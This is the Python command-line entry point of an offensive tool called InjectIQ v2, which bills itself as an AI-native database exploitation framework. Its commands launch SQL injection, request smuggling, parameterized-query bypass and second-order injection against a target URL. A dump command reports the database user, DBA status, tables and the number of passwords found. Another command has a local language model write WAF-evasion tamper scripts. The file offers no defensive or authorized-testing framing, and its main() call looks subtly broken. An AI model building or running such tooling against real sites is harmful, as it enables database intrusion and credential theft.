#!/usr/bin/env python3
"""
InjectIQ v2 — CLI Entry Point
AI-Native Database Exploitation Framework for ArcaneOS

Usage:
    injectiq scan --url https://target.com/page?id=1
    injectiq scan --url https://target.com/api --method POST --data '{"q":"test"}' --graphql
    injectiq smuggle --url https://target.com
    injectiq dump --url https://target.com/page?id=1 --dbms mysql
    injectiq bypass --url https://target.com/page?id=1  # Parameterized query bypass
    injectiq second-order --store-url https://target.com/register --trigger-url https://target.com/admin
"""

import asyncio
import json
import sys

import click

from .inject import InjectIQEngine
from .smuggling import SmugglingEngine
from .param_bypass import ParameterizedBypassEngine, SecondOrderEngine
from .ai_copilot import AICopilot


@click.group()
@click.version_option(version="2.0.0")
def cli():
    """InjectIQ v2 — AI-Native Database Exploitation Framework"""
    pass


@cli.command()
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--method", "-m", default="GET", help="HTTP method")
@click.option("--data", "-d", default=None, help="POST data (JSON)")
@click.option("--headers", "-H", multiple=True, help="Custom headers (Key: Value)")
@click.option("--cookies", "-C", multiple=True, help="Cookies (Key=Value)")
@click.option("--auto/--no-auto", default=True, help="Autonomous extraction")
@click.option("--ai-model", default="qwen2.5-coder:7b", help="Ollama model")
def scan(url, method, data, headers, cookies, auto, ai_model):
    """Full probe + injection scan against target."""
    parsed_data = json.loads(data) if data else None
    parsed_headers = dict(h.split(": ", 1) for h in headers) if headers else None
    parsed_cookies = dict(c.split("=", 1) for c in cookies) if cookies else None

    engine = InjectIQEngine()
    result = asyncio.run(engine.attack(
        url, method, parsed_data, parsed_headers, parsed_cookies, auto
    ))
    click.echo(json.dumps(result, indent=2, default=str))


@cli.command()
@click.option("--url", "-u", required=True, help="Target URL")
def smuggle(url):
    """Test for HTTP request smuggling vulnerabilities."""
    engine = SmugglingEngine()
    result = asyncio.run(engine.detect(url))
    click.echo(json.dumps(result, indent=2, default=str))


@cli.command()
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--dbms", default="mysql", help="DBMS type")
@click.option("--original-query", default="SELECT * FROM users WHERE id = ?",
              help="Original parameterized query")
def bypass(url, dbms, original_query):
    """Try parameterized query bypass techniques."""
    engine = ParameterizedBypassEngine()
    contexts = engine.get_injection_contexts(original_query)
    click.echo(f"\n[*] Detected {len(contexts)} non-parameterizable contexts:")
    for ctx in contexts:
        click.echo(f"    - {ctx['context']}: {ctx['description']} (confidence: {ctx['confidence']:.0%})")
    payloads = engine.generate_payloads(dbms)
    click.echo(f"\n[*] Generated {len(payloads)} bypass payloads:")
    for p in payloads[:10]:
        click.echo(f"    [{p['technique']}] {p['payload'][:80]}")


@cli.command()
@click.option("--store-url", required=True, help="URL to inject stored payload")
@click.option("--trigger-url", required=True, help="URL where stored data is used")
@click.option("--fields", default="{}", help="JSON fields for storage")
def second_order(store_url, trigger_url, fields):
    """Second-order injection: inject stored data, trigger later use."""
    engine = SecondOrderEngine()
    storage_fields = json.loads(fields)
    click.echo(f"\n[*] Second-order injection:")
    click.echo(f"    Storage: {store_url}")
    click.echo(f"    Trigger: {trigger_url}")
    for point_name, config in engine.STORAGE_POINTS.items():
        click.echo(f"\n  [{point_name}]")
        for field in config["fields"]:
            click.echo(f"    Field: {field}")
            for payload in config["payloads"][:2]:
                click.echo(f"      -> {payload}")


@cli.command()
@click.option("--waf", required=True, help="WAF type")
@click.option("--dbms", default="mysql", help="DBMS type")
@click.option("--blocked-payloads", multiple=True, help="Sample blocked payloads")
@click.option("--model", default="qwen2.5-coder:7b", help="Ollama model")
def generate_tamper(waf, dbms, blocked_payloads, model):
    """AI-generate a novel tamper script for specific WAF+DBMS combo."""
    copilot = AICopilot(model=model)
    result = asyncio.run(copilot.generate_tamper_script(waf, dbms, list(blocked_payloads)))
    click.echo(f"\n[*] AI-generated tamper script for {waf} + {dbms}:")
    click.echo(result)


@cli.command()
@click.option("--url", "-u", required=True, help="Target URL")
@click.option("--method", "-m", default="GET", help="HTTP method")
@click.option("--data", "-d", default=None, help="POST data (JSON)")
@click.option("--dbms", default="mysql", help="DBMS type")
def dump(url, method, data, dbms):
    """Full database dump using identified injection."""
    engine = InjectIQEngine()
    parsed_data = json.loads(data) if data else None
    result = asyncio.run(engine.attack(url, method, parsed_data, auto=True))
    if result.get("status") == "injection_found":
        extraction = result.get("extraction", {})
        click.echo(f"\n[+] Database dump results:")
        click.echo(f"    DBMS: {extraction.get('dbms_version', 'unknown')}")
        click.echo(f"    User: {extraction.get('current_user', 'unknown')}")
        click.echo(f"    DBA:  {extraction.get('is_dba', False)}")
        click.echo(f"    Tables: {', '.join(extraction.get('tables', [])[:10])}")
        click.echo(f"    Passwords found: {extraction.get('passwords_count', 0)}")
    else:
        click.echo(f"\n[-] No injection found")


def main():
    asyncio.run(cli())


if __name__ == "__main__":
    main()
